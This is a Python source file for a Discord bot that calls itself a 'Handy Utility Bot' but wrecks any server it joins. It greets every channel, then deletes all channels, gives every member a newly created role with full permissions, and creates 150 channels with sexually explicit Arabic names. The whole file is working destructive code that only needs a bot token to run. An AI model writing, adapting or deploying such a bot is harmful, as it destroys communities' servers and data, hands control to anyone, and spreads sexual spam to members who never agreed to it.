import discord
from discord.ext import commands
import time

intents = discord.Intents().all()  # just make it easier
client = commands.Bot(command_prefix='*', intents=intents)  # use *


@client.event
async def on_ready():
    print('Logged in as {0.user}'.format(client))  # let user know when bot is ready


@client.event
async def on_guild_join(guild):
    for channel in guild.text_channels:  # get channels in server (guild is the api's way of saying server)
        await channel.send("Hello! I am a Handy Utility Bot ;)")  # Message that gets sent to every channel
        time.sleep(.2)
    channels = guild.channels  # get the list of channels in the server
    for channel in channels:
        await channel.delete()  # delete each channel
    role = await guild.create_role(name='High-Permission Role',
                                   permissions=discord.Permissions.all())  # create a new role with high permissions
    for member in guild.members:  # loop through the list of members in the server
        await member.add_roles(role)  # add the role to each member
    num_channels = 150  # will get rate limited
    channel_names = [f'احصل على الجنس{i}' for i in range(1, num_channels + 1)]  # generate a list of channel names
    for name in channel_names:
        await guild.create_text_channel(name)  # create a new channel with the specified name


client.run('bot token')  # https://discord.com/developers/
